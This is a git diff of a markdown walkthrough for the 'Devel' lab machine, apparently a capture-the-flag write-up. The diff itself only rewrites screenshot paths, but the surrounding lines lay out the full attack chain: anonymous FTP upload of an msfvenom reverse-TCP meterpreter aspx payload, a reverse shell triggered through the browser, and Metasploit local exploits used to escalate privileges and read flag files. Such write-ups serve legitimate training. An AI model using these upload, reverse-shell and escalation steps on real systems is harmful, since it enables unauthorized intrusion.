@@ -18,7 +18,7 @@ nmap -sV -sC -oA nmap/devel 10.10.10.5
 
 ###### Output 
 
-![](/Windows/Windows-Easy/Devel/Screenshots/namapdevel.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Devel/Screenshots/namapdevel.png)
 
 ```sh
 nmap -sV -sC -oA nmap/devel 10.10.10.5                                                                                            ─╯
@@ -62,7 +62,7 @@ ftp 10.10.10.5
 
 ###### output
 
-![](/Windows/Windows-Easy/Devel/Screenshots/ftpdevel.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Devel/Screenshots/ftpdevel.png)
 
 Attempting to connect anonymously via FTP reveals that the server does allow anonymous login
 with `read/write privileges` in the `IIS server directory`.
@@ -81,7 +81,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4445 -f aspx
 ```
 
 ###### output
-![](/Windows/Windows-Easy/Devel/Screenshots/msfvenomdevel.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Devel/Screenshots/msfvenomdevel.png)
 
 After creating the `aspx` exploit we can then  upload it to the server using ftp  via `put command`
 
@@ -93,7 +93,7 @@ put ./devel.aspx
 
 ###### output
 
-![](/Windows/Windows-Easy/Devel/Screenshots/putdevel.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Devel/Screenshots/putdevel.png)
 
 We then start a listener in Metasploit,
 
@@ -109,31 +109,31 @@ exploit -j
 ```
 
 ###### output
-![](/Windows/Windows-Easy/Devel/Screenshots/msfconsoledevel.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Devel/Screenshots/msfconsoledevel.png)
 
 Then we navigate to the browser by browsing [http://10.10.10.5/devel.aspx](http://10.10.10.5/devel.aspx) will trigger
 the reverse shell
 
 ###### output
 
-![](/Windows/Windows-Easy/Devel/Screenshots/shelldevel.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Devel/Screenshots/shelldevel.png)
 
 By default, the working directory is set to `c:\windows\system32\inetsrv`, which the `IIS user ` does not have write permissions for. Navigating to `c:\windows\TEMP` is a good idea, as a large portion of Metasploit’s Windows privilege escalation modules require a file to be written to the target during exploitation.
 
 ###### output
 
-![](/Windows/Windows-Easy/Devel/Screenshots/tempdevel.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Devel/Screenshots/tempdevel.png)
 
 # Privillage Escalation
 Running `systeminfo` reveals that the target is x86 architecture, so it is possible to get fairly reliable suggestions with the local_exploit_suggester module. The same can
 not be said for running the module on x64.
 
-![](/Windows/Windows-Easy/Devel/Screenshots/systeminfodevel.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Devel/Screenshots/systeminfodevel.png)
 
 Now we exit then we go back to background the session and search for `suggester`
 
 
-![](Windows/Windows-Easy/Devel/Screenshots/suggestdevel.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Devel/Screenshots/suggestdevel.png)
 ###### code 
 
 ```sh
@@ -146,11 +146,11 @@ run
 
 ###### output
 
-![](/Windows/Windows-Easy/Devel/Screenshots/sessiondevel.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Devel/Screenshots/sessiondevel.png)
 
 Running the suggester gives the following recommended escalation modules:
 
-![](/Windows/Windows-Easy/Devel/Screenshots/moduledevel.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Devel/Screenshots/moduledevel.png)
 
 ```sh
 [+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
@@ -171,7 +171,7 @@ Running the suggester gives the following recommended escalation modules:
 
 ```
 
-![](/Windows/Windows-Easy/Devel/Screenshots/potentialdevel.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Devel/Screenshots/potentialdevel.png)
 
 Going down the list, `bypassauc_eventvwr` fails due to the IIS user not being a part of the
 administrators group, which is the default and to be expected. The second option,
@@ -189,15 +189,15 @@ run
 
 ###### output
 
-![](/Windows/Windows-Easy/Devel/Screenshots/kitproddevel.png)
-![](/Windows/Windows-Easy/Devel/Screenshots/session2devel.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Devel/Screenshots/kitproddevel.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Devel/Screenshots/session2devel.png)
 
 The exploit works and triggers another meterpreter sessions which  when load the session we check the `whoami` is logged in as root
 
-![](/Windows/Windows-Easy/Devel/Screenshots/rootdevel.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Devel/Screenshots/rootdevel.png)
 
 The flags can now be obtained from `c:\Users\babis\Desktop\user.txt` and `c:\Users\Administrator\Desktop\root.txt` 
 
-![](/Windows/Windows-Easy/Devel/Screenshots/flagsdevel.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Devel/Screenshots/flagsdevel.png)
 
 	-------------------------END successful attack @lesley----------------------
